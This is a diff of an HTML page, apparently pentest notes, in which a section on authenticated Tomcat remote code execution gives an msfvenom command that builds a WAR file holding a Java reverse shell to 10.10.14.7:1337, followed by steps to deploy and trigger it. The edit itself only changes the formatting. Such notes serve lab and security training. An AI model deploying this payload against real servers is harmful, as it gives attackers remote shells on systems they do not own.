@@ -50,8 +50,7 @@
 <h3 id="rce-authenicated">RCE (Authenicated)</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a malicious WAR file</span>
 </span></span><span class="line"><span class="cl">msfvenom -p java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.7 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f war -o revshell.war
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 1. Login to Tomcat Web Application Manager</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 1. Login to Tomcat Web Application Manager</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 2. WAR file to deploy -&gt; Deploy</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 3. Click /revshell in Applications table</span>
 </span></span></code></pre></div><br>
